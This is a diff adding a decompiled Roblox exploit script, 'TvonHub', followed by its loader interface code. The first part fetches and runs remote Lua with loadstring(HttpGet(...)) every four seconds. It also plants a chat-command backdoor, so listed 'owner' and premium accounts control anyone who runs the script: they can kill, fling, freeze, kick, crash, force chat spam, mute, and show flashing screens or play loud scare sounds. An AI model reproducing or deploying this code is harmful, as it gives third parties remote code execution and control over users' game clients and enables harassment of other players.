@@ -1,0 +1,1763 @@
+if game.PlaceId ~= 117607071210088 then
+	game:GetService("RunService")
+	game:GetService("CoreGui")
+	local v1 = game:GetService("Players")
+	game:GetService("HttpService")
+	local _ = game:GetService("TeleportService")
+	local _ = v1.LocalPlayer
+	local _ = game.PlaceId
+	local _ = game.JobId
+	local _ = v1.LocalPlayer
+	local function v_u_3(p2)
+		game:GetService("StarterGui"):SetCore("SendNotification", {
+			["Title"] = "\239\191\189\217\134\216\168\217\138\217\135 !",
+			["Text"] = p2,
+			["Duration"] = 3
+		})
+	end
+	local v_u_4 = game:GetService("Players")
+	local v_u_5 = v_u_4.LocalPlayer
+	local v_u_6 = game:GetService("TextChatService")
+	local v_u_7 = game:GetService("ReplicatedStorage")
+	local v_u_8 = v_u_6.ChatVersion == Enum.ChatVersion.LegacyChatService
+	local v_u_9 = {}
+	local v_u_10 = {}
+	local v_u_11 = {
+		["edpv"] = true,
+		["jojo755"] = true,
+		["aligemskg1"] = true,
+		["ZXA712"] = true
+	}
+	local v_u_12 = {
+		["edpv"] = true,
+		["e9p"] = true
+	}
+	game.Players.PlayerAdded:Connect(function(p13)
+		-- upvalues: (ref) v_u_12, (ref) v_u_3
+		if v_u_12[p13.Name] then
+			v_u_3("\239\191\189\216\167\216\173\216\168 \216\167\217\132\216\179\217\131\216\177\216\168\216\170 \216\175\216\174\217\132 \216\167\217\132\216\179\217\138\216\177\217\129\216\177 !")
+			p13.CharacterAdded:Connect(function(p14)
+				local v15 = p14:WaitForChild("Humanoid")
+				v15.DisplayName = v15.DisplayName .. " [ TvonHub Owner ! ]"
+			end)
+		end
+	end)
+	local function v17()
+		-- upvalues: (ref) v_u_5, (ref) v_u_11, (ref) v_u_10
+		local v16 = v_u_5.Name
+		return v_u_11[v16] and "\239\191\189\216\175\217\133\217\134" or (v_u_10[v16] and "\239\191\189\216\177\217\138\217\133\217\138\217\136\217\133" or "\239\191\189\216\167\216\175\217\138")
+	end
+	local function v_u_24()
+		-- upvalues: (ref) v_u_10
+		local v18, v19 = pcall(function()
+			return loadstring(game:HttpGet("https://tvon.pages.dev/lua/prem.lua"))()
+		end)
+		if v18 and typeof(v19) == "table" then
+			v_u_10 = {}
+			local v20, v21, v22 = ipairs(v19)
+			while true do
+				local v23
+				v22, v23 = v20(v21, v22)
+				if v22 == nil then
+					break
+				end
+				v_u_10[v23] = true
+			end
+		end
+	end
+	v_u_24()
+	task.spawn(function()
+		-- upvalues: (ref) v_u_24
+		while true do
+			task.wait(4)
+			v_u_24()
+		end
+	end)
+	local function v_u_27(p25)
+		-- upvalues: (ref) v_u_8, (ref) v_u_6, (ref) v_u_7
+		local v26 = tostring(p25)
+		if v_u_8 then
+			v_u_7.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v26, "All")
+		else
+			v_u_6.TextChannels.RBXGeneral:SendAsync(v26)
+		end
+	end
+	local function v_u_40(p28)
+		-- upvalues: (ref) v_u_4
+		if not p28 then
+			return nil
+		end
+		local v29 = p28:lower()
+		local v30 = v_u_4
+		local v31, v32, v33 = pairs(v30:GetPlayers())
+		while true do
+			local v34
+			v33, v34 = v31(v32, v33)
+			if v33 == nil then
+				break
+			end
+			if v34.Name:lower() == v29 or v34.DisplayName and v34.DisplayName:lower() == v29 then
+				return v34
+			end
+		end
+		local v35 = v_u_4
+		local v36, v37, v38 = pairs(v35:GetPlayers())
+		while true do
+			local v39
+			v38, v39 = v36(v37, v38)
+			if v38 == nil then
+				break
+			end
+			if v39.Name:lower():find(v29, 1, true) or v39.DisplayName and v39.DisplayName:lower():find(v29, 1, true) then
+				return v39
+			end
+		end
+		return nil
+	end
+	local v_u_41 = nil
+	local v_u_42 = nil
+	local v_u_43 = nil
+	local v_u_44 = nil
+	local v_u_45 = 10
+	local v_u_46 = nil
+	local function v_u_48(p47)
+		-- upvalues: (ref) v_u_41, (ref) v_u_42, (ref) v_u_43, (ref) v_u_44, (ref) v_u_46
+		if p47 then
+			if v_u_41 then
+				v_u_41:Disconnect()
+			end
+			if v_u_42 then
+				v_u_42:Stop()
+			end
+			if v_u_43 then
+				v_u_43:Destroy()
+			end
+			if v_u_44 then
+				v_u_44:Disconnect()
+			end
+			if p47 and p47.Character then
+				p47.Character.Animate.Disabled = false
+			end
+			v_u_41 = nil
+			v_u_42 = nil
+			v_u_43 = nil
+			v_u_44 = nil
+			v_u_46 = nil
+		end
+	end
+	local function v_u_55(p_u_49, p50)
+		-- upvalues: (ref) v_u_48, (ref) v_u_46, (ref) v_u_5, (ref) v_u_43, (ref) v_u_42, (ref) v_u_45, (ref) v_u_44, (ref) v_u_41
+		v_u_48(p_u_49)
+		if p_u_49 and p_u_49.Character then
+			local v_u_51 = p50 or p_u_49
+			v_u_46 = p_u_49
+			v_u_5.Character.Humanoid.Sit = false
+			p_u_49.Character.Animate.Disabled = false
+			local v52 = p_u_49.Character.Humanoid
+			v52:GetPlayingAnimationTracks()
+			p_u_49.Character.Animate.Disabled = true
+			v_u_43 = Instance.new("Animation")
+			v_u_43.AnimationId = "rbxassetid://10714360343"
+			v_u_42 = v52:LoadAnimation(v_u_43)
+			v_u_42:Play()
+			v_u_42.TimePosition = 2
+			v_u_42:AdjustSpeed(v_u_45)
+			v_u_44 = v52.Died:Connect(function()
+				-- upvalues: (ref) v_u_48, (ref) p_u_49
+				v_u_48(p_u_49)
+			end)
+			local v_u_53 = true
+			v_u_41 = game:GetService("RunService").Heartbeat:Connect(function()
+				-- upvalues: (ref) p_u_49, (ref) v_u_51, (ref) v_u_48, (ref) v_u_53
+				pcall(function()
+					-- upvalues: (ref) p_u_49, (ref) v_u_51, (ref) v_u_48, (ref) v_u_53
+					if p_u_49.Character and (p_u_49.Character:FindFirstChild("HumanoidRootPart") and v_u_51.Character and v_u_51.Character:FindFirstChild("HumanoidRootPart")) then
+						local v54 = v_u_53 and -2 or -1
+						p_u_49.Character.HumanoidRootPart.CFrame = v_u_51.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, v54)
+						v_u_53 = not v_u_53
+						wait(0.3)
+					else
+						v_u_48(p_u_49)
+					end
+				end)
+			end)
+		end
+	end
+	local function v_u_59(p56, _)
+		if p56 and p56.Character then
+			local v57 = p56.Character:FindFirstChild("HumanoidRootPart")
+			if v57 then
+				local v58 = Instance.new("BodyGyro")
+				v58.Name = "SpinningGyro"
+				v58.P = 100000
+				v58.MaxTorque = Vector3.new(0, math.huge, 0)
+				v58.CFrame = v57.CFrame
+				v58.Parent = v57
+			end
+		else
+			return
+		end
+	end
+	local function v_u_65(p60)
+		if p60 and p60.Character then
+			local v61, v62, v63 = pairs(p60.Character:GetChildren())
+			while true do
+				local v64
+				v63, v64 = v61(v62, v63)
+				if v63 == nil then
+					break
+				end
+				if v64.Name == "SpinningGyro" then
+					v64:Destroy()
+				end
+			end
+		end
+	end
+	local function v_u_68(p66)
+		if p66 and p66.Character then
+			local v67 = p66.Character:FindFirstChildOfClass("Humanoid")
+			if v67 then
+				v67.Sit = true
+				task.wait(0.1)
+				v67.RootPart.CFrame = v67.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
+			end
+		end
+	end
+	local function v_u_128(p_u_69, p70, p71)
+		-- upvalues: (ref) v_u_11, (ref) v_u_10, (ref) v_u_5, (ref) v_u_40, (ref) v_u_27, (ref) v_u_9, (ref) v_u_59, (ref) v_u_65, (ref) v_u_68, (ref) v_u_55, (ref) v_u_48
+		local v72 = v_u_11[p_u_69.Name] or false
+		local v_u_73 = v_u_10[p_u_69.Name] or false
+		if v72 or v_u_73 then
+			local function v77(p74, p75)
+				-- upvalues: (ref) v_u_5, (ref) v_u_40, (ref) v_u_11, (ref) v_u_10, (ref) v_u_73
+				local v76
+				if p74 == "." then
+					v76 = v_u_5
+				else
+					v76 = v_u_40(p74)
+				end
+				if v76 then
+					if not (v_u_73 and (v_u_11[v76.Name] or v_u_10[v76.Name])) then
+						p75(v76)
+					end
+				else
+					return
+				end
+			end
+			if p70 == "test" then
+				v_u_27(v_u_5.Name .. " \217\133\217\136\216\172\217\136\216\175!")
+			elseif p70 == "bring" then
+				if #p71 < 2 then
+					if #p71 >= 1 then
+						v77(p71[1], function(p78)
+							-- upvalues: (ref) p_u_69
+							if p78.Character and p_u_69.Character then
+								p78.Character.HumanoidRootPart.CFrame = p_u_69.Character.HumanoidRootPart.CFrame
+							end
+						end)
+					end
+				else
+					local v79 = v_u_40(p71[1])
+					local v80 = v_u_40(p71[2])
+					if v79 and (v80 and v80.Character) then
+						v_u_5.Character.HumanoidRootPart.CFrame = v80.Character.HumanoidRootPart.CFrame
+					end
+				end
+			elseif p70 == "say" then
+				if #p71 >= 2 then
+					local v81 = p71[1]
+					table.remove(p71, 1)
+					local v_u_82 = table.concat(p71, " ")
+					v77(v81, function(p83)
+						-- upvalues: (ref) v_u_5, (ref) v_u_27, (ref) v_u_82
+						if p83 == v_u_5 then
+							v_u_27(v_u_82)
+						end
+					end)
+				end
+			elseif p70 == "spam" then
+				if #p71 >= 2 then
+					local v84 = p71[1]
+					table.remove(p71, 1)
+					local v_u_85 = table.concat(p71, " ")
+					v77(v84, function(p86)
+						-- upvalues: (ref) v_u_5, (ref) v_u_9, (ref) v_u_27, (ref) v_u_85
+						if p86 == v_u_5 then
+							if v_u_9[v_u_5.Name] then
+								return
+							end
+							v_u_9[v_u_5.Name] = true
+							task.spawn(function()
+								-- upvalues: (ref) v_u_9, (ref) v_u_5, (ref) v_u_27, (ref) v_u_85
+								while v_u_9[v_u_5.Name] do
+									v_u_27(v_u_85)
+									task.wait(0.3)
+								end
+							end)
+						end
+					end)
+				end
+			elseif p70 == "unspam" then
+				if #p71 >= 1 then
+					v77(p71[1], function(p87)
+						-- upvalues: (ref) v_u_5, (ref) v_u_9
+						if p87 == v_u_5 then
+							v_u_9[v_u_5.Name] = false
+						end
+					end)
+				end
+			elseif p70 == "sit" then
+				if #p71 < 1 then
+					v_u_5.Character.Humanoid.Sit = true
+				else
+					v77(p71[1], function(p88)
+						if p88.Character then
+							p88.Character.Humanoid.Sit = true
+						end
+					end)
+				end
+			elseif p70 == "slow" then
+				if #p71 < 1 then
+					v_u_5.Character.Humanoid.WalkSpeed = 3
+				else
+					v77(p71[1], function(p89)
+						if p89.Character then
+							p89.Character.Humanoid.WalkSpeed = 3
+						end
+					end)
+				end
+			elseif p70 == "unslow" then
+				if #p71 < 1 then
+					v_u_5.Character.Humanoid.WalkSpeed = 16
+				else
+					v77(p71[1], function(p90)
+						if p90.Character then
+							p90.Character.Humanoid.WalkSpeed = 16
+						end
+					end)
+				end
+			elseif p70 == "jump" then
+				if #p71 < 1 then
+					v_u_5.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+				else
+					v77(p71[1], function(p91)
+						if p91.Character then
+							p91.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+						end
+					end)
+				end
+			elseif p70 == "spin" then
+				if #p71 < 1 then
+					v_u_59(v_u_5, 10)
+				else
+					v77(p71[1], function(p92)
+						-- upvalues: (ref) v_u_59
+						v_u_59(p92, 10)
+					end)
+				end
+			elseif p70 == "unspin" then
+				if #p71 < 1 then
+					v_u_65(v_u_5)
+				else
+					v77(p71[1], function(p93)
+						-- upvalues: (ref) v_u_65
+						v_u_65(p93)
+					end)
+				end
+			elseif p70 == "mute" then
+				if #p71 < 1 then
+					v_u_5.PlayerGui.Chat.Enabled = false
+				else
+					v77(p71[1], function(p94)
+						if p94 then
+							p94.PlayerGui.Chat.Enabled = false
+						end
+					end)
+				end
+			elseif p70 == "umute" then
+				if #p71 < 1 then
+					v_u_5.PlayerGui.Chat.Enabled = true
+				else
+					v77(p71[1], function(p95)
+						if p95 then
+							p95.PlayerGui.Chat.Enabled = true
+						end
+					end)
+				end
+			elseif p70 == "hairless" then
+				if #p71 < 1 then
+					local v96, v97, v98 = pairs(v_u_5.Character:GetChildren())
+					while true do
+						local v99
+						v98, v99 = v96(v97, v98)
+						if v98 == nil then
+							break
+						end
+						if v99:IsA("Accessory") then
+							v99:Destroy()
+						end
+					end
+				else
+					v77(p71[1], function(p100)
+						if p100 and p100.Character then
+							local v101, v102, v103 = pairs(p100.Character:GetChildren())
+							while true do
+								local v104
+								v103, v104 = v101(v102, v103)
+								if v103 == nil then
+									break
+								end
+								if v104:IsA("Accessory") then
+									v104:Destroy()
+								end
+							end
+						end
+					end)
+				end
+			elseif p70 == "lay" then
+				if #p71 < 1 then
+					v_u_68(v_u_5)
+				else
+					v77(p71[1], function(p105)
+						-- upvalues: (ref) v_u_68
+						v_u_68(p105)
+					end)
+				end
+			elseif p70 == "dance" then
+				v_u_27("/e dance")
+			elseif p70 == "fling" then
+				if #p71 < 1 then
+					local v106 = v_u_5.Character:FindFirstChild("HumanoidRootPart")
+					if v106 then
+						local v107 = Instance.new("BodyThrust", v106)
+						v107.Force = Vector3.new(999999, 999999, 999999)
+						v107.Name = "fling"
+					end
+				else
+					v77(p71[1], function(p108)
+						local v109 = p108 and p108.Character and p108.Character:FindFirstChild("HumanoidRootPart")
+						if v109 then
+							local v110 = Instance.new("BodyThrust", v109)
+							v110.Force = Vector3.new(999999, 999999, 999999)
+							v110.Name = "fling"
+						end
+					end)
+				end
+			elseif p70 == "freeze" then
+				if #p71 < 1 then
+					v_u_5.Character.HumanoidRootPart.Anchored = true
+				else
+					v77(p71[1], function(p111)
+						if p111 and p111.Character then
+							p111.Character.HumanoidRootPart.Anchored = true
+						end
+					end)
+				end
+			elseif p70 == "unfreeze" then
+				if #p71 < 1 then
+					v_u_5.Character.HumanoidRootPart.Anchored = false
+				else
+					v77(p71[1], function(p112)
+						if p112 and p112.Character then
+							p112.Character.HumanoidRootPart.Anchored = false
+						end
+					end)
+				end
+			elseif p70 == "kill" then
+				if #p71 < 1 then
+					v_u_5.Character.Humanoid.Health = 0
+				else
+					v77(p71[1], function(p113)
+						if p113 and p113.Character then
+							p113.Character.Humanoid.Health = 0
+						end
+					end)
+				end
+			elseif p70 == "benx" then
+				if #p71 >= 1 then
+					local v114 = v_u_40(p71[1])
+					local v115 = #p71 >= 2 and v_u_40(p71[2]) or v_u_5
+					if v114 then
+						v_u_55(v114, v115)
+					end
+				end
+			elseif p70 == "unbenx" then
+				local v116 = #p71 >= 1 and v_u_40(p71[1])
+				if v116 then
+					v_u_48(v116)
+				end
+			elseif p70 == "crash" and v72 then
+				if #p71 >= 1 and v_u_40(p71[1]) then
+					while true do
+
+					end
+				end
+			elseif p70 == "kick" then
+				local v117 = #p71 >= 1 and v_u_40(p71[1])
+				if v117 then
+					v117:Kick("You have been kicked by an admin")
+				end
+			elseif p70 == "meme" then
+				v_u_27("/e meme")
+				local v118 = Instance.new("ScreenGui")
+				local v119 = Instance.new("ImageLabel")
+				local v120 = {
+					"7866490119",
+					"4732992778",
+					"11233808214",
+					"12623079242",
+					"10246338786",
+					"12166869331"
+				}
+				v118.Parent = game.CoreGui
+				v118.Name = "Meme Image"
+				v118.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+				v119.Parent = v118
+				v119.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+				v119.Position = UDim2.new(0, 0, -0.000674206764, 0)
+				v119.Size = UDim2.new(1, 0, 1.00857365, 0)
+				v119.Image = "rbxassetid://" .. v120[math.random(1, #v120)]
+				v119.Visible = false
+				v119.BackgroundTransparency = 1
+				v119.Visible = true
+				game:GetService("TweenService"):Create(v119, TweenInfo.new(10), {
+					["ImageTransparency"] = 2
+				}):Play()
+				wait(6)
+				v118:Destroy()
+			elseif p70 == "flash" then
+				local v121 = Instance.new("ScreenGui")
+				local v122 = Instance.new("Frame")
+				local v123 = math.random(99, 25252) .. "+++lol"
+				v121.Name = v123
+				v121.Parent = game.CoreGui
+				v121.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+				v122.Parent = v121
+				v122.AnchorPoint = Vector2.new(0.5, 0.5)
+				v122.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+				v122.BorderColor3 = Color3.fromRGB(255, 255, 255)
+				v122.BorderSizePixel = 100
+				v122.Position = UDim2.new(0.5, 0, 0.5, 0)
+				v122.Size = UDim2.new(1, 0, 1, 0)
+				for _ = 1, 100 do
+					v122.Transparency = v122.Transparency + 0.01
+					wait(0.1)
+				end
+				game.CoreGui:FindFirstChild(v123):Destroy()
+			elseif p70 == "scream" then
+				function Scare()
+					local v124 = {
+						"7236404523",
+						"6150329916",
+						"8195739170",
+						"8628815817"
+					}
+					local v125 = Instance.new("Sound")
+					v125.Parent = game.Workspace
+					v125.SoundId = "rbxassetid://" .. v124[math.random(1, #v124)]
+					v125.Volume = 200
+					v125:Play()
+					v125.Ended:Wait()
+					v125:Destroy()
+				end
+				Scare()
+			elseif p70 == "milk" then
+				local v126 = Instance.new("ScreenGui")
+				local v127 = Instance.new("ImageLabel")
+				v126.Parent = game.CoreGui
+				v126.Name = "ScreenGui"
+				v127.Name = "milk"
+				v127.ImageTransparency = 0
+				v127.BackgroundTransparency = 1
+				v127.Parent = v126
+				v127.Position = UDim2.new(0, 0, 0, 0)
+				v127.Size = UDim2.new(1, 0, 1, 0)
+				v127.Image = "rbxassetid://12480466786"
+				v126.IgnoreGuiInset = true
+				task.wait(5)
+				v126:Destroy()
+			end
+		end
+	end
+	local function v_u_136(p129, p130)
+		-- upvalues: (ref) v_u_128
+		local v131, v132, v133 = p130:gmatch("%S+")
+		local v134 = {}
+		while true do
+			v133 = v131(v132, v133)
+			if v133 == nil then
+				break
+			end
+			table.insert(v134, v133)
+		end
+		if #v134 >= 1 then
+			local v135 = v134[1]:lower():gsub("-", "")
+			table.remove(v134, 1)
+			v_u_128(p129, v135, v134)
+		end
+	end
+	local v137, v138, v139 = pairs(v_u_4:GetPlayers())
+	local v_u_140 = v_u_65
+	local v_u_141 = v_u_48
+	local v_u_142 = v_u_46
+	local v_u_143 = v_u_40
+	local v_u_144 = v_u_11
+	local v_u_145 = v_u_10
+	while true do
+		local v146, v_u_147 = v137(v138, v139)
+		if v146 == nil then
+			break
+		end
+		v139 = v146
+		if v_u_145[v_u_147.Name] or v_u_144[v_u_147.Name] then
+			v_u_147.Chatted:Connect(function(p148)
+				-- upvalues: (ref) v_u_136, (ref) v_u_147
+				v_u_136(v_u_147, p148)
+			end)
+		end
+	end
+	v_u_4.PlayerAdded:Connect(function(p_u_149)
+		-- upvalues: (ref) v_u_145, (ref) v_u_144, (ref) v_u_136
+		if v_u_145[p_u_149.Name] or v_u_144[p_u_149.Name] then
+			p_u_149.Chatted:Connect(function(p150)
+				-- upvalues: (ref) v_u_136, (ref) p_u_149
+				v_u_136(p_u_149, p150)
+			end)
+		end
+	end)
+	local v151 = v_u_5.PlayerGui and (v_u_5.PlayerGui:FindFirstChild("ExperienceChat") and v_u_5.PlayerGui.ExperienceChat:FindFirstChild("appLayout")) and (v_u_5.PlayerGui.ExperienceChat.appLayout:FindFirstChild("chatWindow") and v_u_5.PlayerGui.ExperienceChat.appLayout.chatWindow:FindFirstChild("scrollingView") and (v_u_5.PlayerGui.ExperienceChat.appLayout.chatWindow.scrollingView:FindFirstChild("bottomLockedScrollView") and v_u_5.PlayerGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView:FindFirstChild("RCTScrollView")))
+	if v151 then
+		v151 = v_u_5.PlayerGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView:FindFirstChild("RCTScrollContentView")
+	end
+	if v151 then
+		v151.ChildAdded:Connect(function(p152)
+			-- upvalues: (ref) v_u_145, (ref) v_u_144, (ref) v_u_143, (ref) v_u_136
+			task.wait(0.1)
+			local v153, v154, v155 = pairs(p152:GetDescendants())
+			while true do
+				local v156
+				v155, v156 = v153(v154, v155)
+				if v155 == nil then
+					break
+				end
+				if v156:IsA("TextLabel") and v156.Text ~= "" then
+					local v157 = v156.Text:match(">([^<]+)<")
+					local v158 = v156.Text:match(">[^<]+</font>.*:%s*(.+)")
+					if v157 and (v158 and (v_u_145[v157] or v_u_144[v157])) and v158:sub(1, 1) == "-" then
+						print("cmd from" .. v157 .. "| " .. v158)
+						local v159 = v_u_143(v157)
+						if v159 then
+							v_u_136(v159, v158)
+						end
+					end
+					break
+				end
+			end
+		end)
+	end
+	v_u_5.CharacterRemoving:Connect(function()
+		-- upvalues: (ref) v_u_142, (ref) v_u_141, (ref) v_u_140, (ref) v_u_5
+		if v_u_142 then
+			v_u_141(v_u_142)
+		end
+		v_u_140(v_u_5)
+	end)
+	local _ = game:GetService("Players").LocalPlayer
+	local v160 = game.CoreGui
+	if v160:FindFirstChild("TovnHubLoaderGui") then
+		return
+	elseif not v160:FindFirstChild("TvonHubLoaderIntroGui") then
+		local v_u_161 = game:GetService("TweenService")
+		local v162 = {}
+		local v_u_163 = Instance.new("ScreenGui")
+		local v_u_164 = Instance.new("ImageLabel")
+		local v_u_165 = Instance.new("Frame")
+		local v166 = Instance.new("UICorner")
+		local v_u_167 = Instance.new("ImageLabel")
+		local v168 = Instance.new("Frame")
+		local v169 = Instance.new("UIGradient")
+		local v170 = Instance.new("Frame")
+		local v171 = Instance.new("UIGradient")
+		local v172 = Instance.new("ImageLabel")
+		local v173 = Instance.new("ImageButton")
+		local v174 = Instance.new("Folder")
+		local v_u_175 = Instance.new("ScrollingFrame")
+		local v176 = Instance.new("UIListLayout")
+		local v177 = Instance.new("Frame")
+		local v178 = Instance.new("Frame")
+		local v179 = Instance.new("UICorner")
+		local v180 = Instance.new("UIStroke")
+		local v181 = Instance.new("Frame")
+		local v182 = Instance.new("UICorner")
+		local v183 = Instance.new("Frame")
+		local v184 = Instance.new("ImageLabel")
+		local v185 = Instance.new("TextLabel")
+		local v186 = Instance.new("TextLabel")
+		local v187 = Instance.new("Frame")
+		local v188 = Instance.new("UICorner")
+		local v189 = Instance.new("Frame")
+		local v190 = Instance.new("UICorner")
+		local v191 = Instance.new("Frame")
+		local v192 = Instance.new("ImageLabel")
+		local v193 = Instance.new("TextLabel")
+		local v194 = Instance.new("UIStroke")
+		local v195 = Instance.new("TextLabel")
+		local v196 = Instance.new("UICorner")
+		local v_u_197 = Instance.new("ScrollingFrame")
+		local v_u_198 = Instance.new("UIListLayout")
+		local v199 = Instance.new("Frame")
+		local v_u_200 = Instance.new("UICorner")
+		local v_u_201 = Instance.new("ScrollingFrame")
+		local v202 = Instance.new("UIListLayout")
+		local v203 = Instance.new("Frame")
+		local v204 = Instance.new("UICorner")
+		local v205 = Instance.new("Frame")
+		local v206 = Instance.new("UICorner")
+		local v207 = Instance.new("Frame")
+		local v208 = Instance.new("UICorner")
+		local v209 = Instance.new("Frame")
+		local v210 = Instance.new("ImageLabel")
+		local v211 = Instance.new("TextLabel")
+		local v212 = Instance.new("UIStroke")
+		local v213 = Instance.new("TextLabel")
+		local v214 = Instance.new("ImageLabel")
+		local v215 = Instance.new("UICorner")
+		local v216 = Instance.new("TextLabel")
+		local v217 = Instance.new("TextLabel")
+		local v218 = Instance.new("TextLabel")
+		local v219 = Instance.new("TextLabel")
+		local v220 = Instance.new("ScrollingFrame")
+		local v221 = Instance.new("UIListLayout")
+		local v222 = Instance.new("Frame")
+		local v223 = Instance.new("UICorner")
+		local v224 = Instance.new("ImageButton")
+		local v225 = Instance.new("UICorner")
+		local v_u_226 = Instance.new("ImageLabel")
+		local v_u_227 = Instance.new("TextLabel")
+		local v228 = Instance.new("ImageButton")
+		local v229 = Instance.new("UICorner")
+		local v_u_230 = Instance.new("ImageLabel")
+		local v_u_231 = Instance.new("TextLabel")
+		local v232 = Instance.new("ImageButton")
+		local v233 = Instance.new("UICorner")
+		local v_u_234 = Instance.new("ImageLabel")
+		local v_u_235 = Instance.new("TextLabel")
+		local v_u_236 = Instance.new("ImageButton")
+		local v237 = Instance.new("UICorner")
+		local v_u_238 = Instance.new("ImageLabel")
+		local v239 = Instance.new("ImageLabel")
+		local v240 = Instance.new("UIGradient")
+		local v_u_241 = Instance.new("TextLabel")
+		local v242 = Instance.new("UIScale")
+		v_u_163.Name = "TovnHubLoaderGui"
+		v_u_163.Parent = game.CoreGui
+		v_u_163.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		v_u_164.Name = "ShadowHolder"
+		v_u_164.Parent = v_u_163
+		v_u_164.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_164.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v_u_164.BackgroundTransparency = 2
+		v_u_164.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_164.BorderSizePixel = 0
+		v_u_164.Position = UDim2.new(0.509625614, 0, 0.5, 0)
+		v_u_164.Size = UDim2.new(0, 700, 0, 550)
+		v_u_164.Image = "http://www.roblox.com/asset/?id=186491278"
+		v_u_164.ImageColor3 = Color3.fromRGB(62, 63, 96)
+		v_u_164.ImageTransparency = 1
+		v_u_165.Name = "Main"
+		v_u_165.Parent = v_u_164
+		v_u_165.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_165.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+		v_u_165.BorderColor3 = Color3.fromRGB(58, 58, 58)
+		v_u_165.BorderSizePixel = 0
+		v_u_165.Position = UDim2.new(0.5, 0, 0.5, 0)
+		v_u_165.Size = UDim2.new(0, 0, 0, 0)
+		v_u_165.ClipsDescendants = true
+		v166.Name = "MainCorner"
+		v166.Parent = v_u_165
+		v_u_167.Name = "MainShadow"
+		v_u_167.Parent = v_u_165
+		v_u_167.AnchorPoint = Vector2.new(0.5, 0.5)
+		v_u_167.BackgroundTransparency = 1
+		v_u_167.BorderSizePixel = 0
+		v_u_167.Position = UDim2.new(0.502499998, 0, 0.49666667, 0)
+		v_u_167.Size = UDim2.new(1, 47, 1, 47)
+		v_u_167.ZIndex = 0
+		v_u_167.Image = "rbxassetid://6015897843"
+		v_u_167.ImageColor3 = Color3.fromRGB(18, 18, 18)
+		v_u_167.ImageTransparency = 2
+		v_u_167.ScaleType = Enum.ScaleType.Slice
+		v_u_167.SliceCenter = Rect.new(49, 49, 450, 450)
+		v168.Name = "UpDownLine"
+		v168.Parent = v_u_165
+		v168.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v168.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v168.BorderSizePixel = 0
+		v168.Position = UDim2.new(0.675000012, 0, 0.140000001, 0)
+		v168.Size = UDim2.new(0, 1, 0, 258)
+		v169.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 50, 50)), ColorSequenceKeypoint.new(0.03, Color3.fromRGB(37, 37, 37)), ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 18)) })
+		v169.Rotation = 90
+		v169.Name = "UpDownLineGradient"
+		v169.Parent = v168
+		v170.Name = "LeftRightLine"
+		v170.Parent = v_u_165
+		v170.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v170.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v170.BorderSizePixel = 0
+		v170.Position = UDim2.new(0, 0, 0.140000001, 0)
+		v170.Size = UDim2.new(0, 400, 0, 1)
+		v171.Color = ColorSequence.new({
+			ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 18)),
+			ColorSequenceKeypoint.new(0.15, Color3.fromRGB(26, 26, 26)),
+			ColorSequenceKeypoint.new(0.4, Color3.fromRGB(47, 47, 47)),
+			ColorSequenceKeypoint.new(0.7, Color3.fromRGB(37, 37, 37)),
+			ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 18))
+		})
+		v171.Name = "LeftRightLineGradient"
+		v171.Parent = v170
+		v172.Name = "LineTvonIcon"
+		v172.Parent = v_u_165
+		v172.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+		v172.BackgroundTransparency = 2
+		v172.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v172.BorderSizePixel = 0
+		v172.Size = UDim2.new(0, 40, 0, 40)
+		v172.Image = "http://www.roblox.com/asset/?id=107247194999685"
+		v173.Name = "CloseButton"
+		v173.Parent = v_u_165
+		v173.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+		v173.BackgroundTransparency = 2
+		v173.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v173.BorderSizePixel = 0
+		v173.Position = UDim2.new(0.917236805, 0, 0.0366666652, 0)
+		v173.Size = UDim2.new(0, 17, 0, 17)
+		v173.Image = "rbxassetid://11293981586"
+		v173.ImageColor3 = Color3.fromRGB(48, 48, 48)
+		v173.MouseButton1Click:Connect(function()
+			_G.RunAnim()
+		end)
+		v174.Parent = v_u_165
+		v_u_175.Name = "HomeScrollingFrame"
+		v_u_175.Parent = v174
+		v_u_175.Active = true
+		v_u_175.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
+		v_u_175.BorderColor3 = Color3.fromRGB(0, 0, 0)
+		v_u_175.BorderSizePixel = 0
+		v_u_175.Position = UDim2.new(0, 0, 0.143333331, 0)
+		v_u_175.Size = UDim2.new(0, 270, 0, 257)
+		v_u_175.BottomImage = ""
+		v_u_175.CanvasSize = UDim2.new(0, 0, 1, 0)
+		v_u_175.BottomImage = ""
+		v_u_175.MidImage = "rbxassetid://6015897843"
+		v_u_175.ScrollBarImageColor3 = Color3.fromRGB(50, 50, 50)
+		v_u_175.TopImage = ""
+		v_u_175.ScrollBarThickness = 3
+		v_u_175.TopImage = ""
+		v176.Name = "HomeScrollingFrameListLayout"
+		v176.Parent = v_u_175
+		v176.HorizontalAlignment = Enum.HorizontalAlignment.Center
+		v176.SortOrder = Enum.SortOrder.LayoutOrder
+		v176.Padding = UDim.new(0, 15)
+		v177.Name = "HomeScrollingFrameFixer"
+		v177.Parent = v_u_175
